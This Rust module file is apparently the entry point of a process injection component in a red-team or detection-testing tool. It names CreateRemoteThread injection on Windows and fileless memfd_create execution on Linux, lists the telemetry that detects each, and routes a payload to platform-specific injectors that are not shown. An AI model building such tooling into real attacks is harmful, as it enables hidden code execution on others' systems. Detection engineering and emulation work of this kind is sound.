//! Process Injection Module
//!
//! Implements classic process injection techniques:
//! - Windows: CreateRemoteThread injection (T1055.002)
//! - Linux: memfd_create + fexecve (fileless execution)
//!
//! Detection artifacts:
//! - Sysmon EID 8: CreateRemoteThread
//! - Sysmon EID 10: Process Access
//! - auditd: memfd_create syscall

#[cfg(windows)]
pub(crate) mod winapi;

#[cfg(windows)]
pub mod windows;

#[cfg(windows)]
pub mod pe_map;

#[cfg(unix)]
pub mod linux;

use thiserror::Error;

#[derive(Debug, Error)]
pub enum InjectionError {
    #[error("failed to find target process")]
    ProcessNotFound,
    #[error("failed to open target process: {0}")]
    OpenFailed(String),
    #[error("failed to allocate memory: {0}")]
    AllocFailed(String),
    #[error("failed to write memory: {0}")]
    WriteFailed(String),
    #[error("failed to create thread: {0}")]
    ThreadFailed(String),
    #[error("failed to execute: {0}")]
    ExecFailed(String),
}

/// Inject payload into target process/memory and execute.
pub fn inject_and_run(payload: &[u8]) -> Result<(), InjectionError> {
    #[cfg(windows)]
    {
        windows::inject(payload)
    }
    #[cfg(unix)]
    {
        linux::run_fileless(payload)
    }
}
